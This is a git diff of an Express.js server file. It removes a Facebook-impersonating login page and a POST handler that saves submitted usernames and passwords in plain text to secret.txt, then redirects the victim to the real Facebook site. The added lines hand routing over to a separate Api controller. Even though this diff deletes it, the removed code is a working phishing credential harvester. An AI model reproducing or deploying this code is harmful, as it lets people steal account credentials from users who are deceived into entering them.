@@ -16,26 +16,9 @@ app.use(body_parser.urlencoded({
   extended: true
 }));
 
-app.get('/', (req, res)=>{
-  res.render('index', {title: 'Facebook — Log in'});
-});
-
-app.post('/hello', (req, res)=>{
-  const userData = `\nUsername: ${req.body.username}\nPassword: ${req.body.password}\n`;
-
-  fs.readFile('./secret.txt', (err, data) => {
-    if (err) throw err;
-    else{
-      data += userData;
-      fs.writeFile('./secret.txt', data, 'utf-8', (err)=>{
-        if (err) throw err;
-      });
-    }
-  });
-
-  res.redirect('https://web.facebook.com/');
-});
-
 app.listen(configs.PORT, ()=>{
   console.log(`Server running on port ${configs.PORT}`);
 });
+
+const api = require('./controllers/Api');
+api.initializeApp(app);
